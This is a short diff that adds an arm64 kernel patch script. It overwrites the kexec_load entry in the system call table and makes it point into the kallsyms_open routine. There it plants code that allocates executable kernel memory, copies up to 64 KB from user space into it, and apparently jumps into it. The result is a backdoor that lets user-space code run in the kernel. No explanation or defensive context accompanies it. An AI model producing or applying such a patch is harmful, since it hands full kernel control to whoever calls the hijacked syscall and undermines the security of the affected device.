@@ -1,0 +1,27 @@
+at sys_call_table
+    .assert
+    .ptr sys_io_setup
+    .ptr sys_io_destroy
+    .ptr sys_io_submit
+    .ptr sys_io_cancel
+
+at sys_call_table+104*8 # __NR_kexec_load*sizeof(void*)
+    .ptr kallsyms_open+8
+
+at kallsyms_open
+    .nosyms
+    mov w0, #0xfffffff3
+    ret
+    sub sp, sp, #0x10
+    str x30, [sp]
+    sub sp, sp, #0x10
+    stp x0, x1, [sp]
+    mov x0, #0x10000
+    .bl vmalloc_exec
+    sub sp, sp, #0x10
+    stp x0, x1, [sp]
+    ldr x1, [sp, #16]
+    mov x2, #0x10000
+    .bl __arch_copy_from_user
+    ldr x30, [sp]
+    ret
